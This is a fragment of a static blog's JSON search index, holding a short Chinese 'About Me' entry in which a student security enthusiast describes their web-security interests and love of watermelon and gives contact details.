","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover主力成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、偶然也会学点云安全,等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"}]